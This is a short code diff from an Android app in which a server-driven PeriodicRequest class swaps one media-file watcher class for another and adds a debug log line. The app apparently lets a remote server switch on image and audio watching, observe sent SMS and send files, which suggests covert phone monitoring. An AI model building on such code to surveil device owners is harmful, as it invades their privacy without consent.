@@ -10,14 +10,16 @@ import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 import android.os.AsyncTask;
 import android.preference.PreferenceManager;
+import android.util.Log;
 
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.info.GetInfo;
 import com.inet.android.list.TurnSendList;
-import com.inet.android.media.monitorMediaFiles;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
+
+import custom.fileobserver.SetStateImage;
 
 /**
  * Periodic request class is designed to handle the server's response
@@ -307,8 +309,9 @@ public class PeriodicRequest extends DefaultRequest {
 			str = null;
 		}
 		if (str != null && audio != null) {
-			monitorMediaFiles stateImage = monitorMediaFiles
-					.getInstance(ctx);
+			
+			SetStateImage stateImage = SetStateImage.getInstance(ctx);
+			Log.d(LOG_TAG, "stateImage" + stateImage.toString());
 			ed.putString("image_state", str);
 			ed.putString("audio_state", str);
 			if (str.equals("1") || audio.equals("1")) {
@@ -317,7 +320,6 @@ public class PeriodicRequest extends DefaultRequest {
 			} else
 				stateImage.StopWatcher();
 		}
-
 		// ----------------method of sending files----------------------
 		try {
 			str = jsonObject.getString("dispatch");
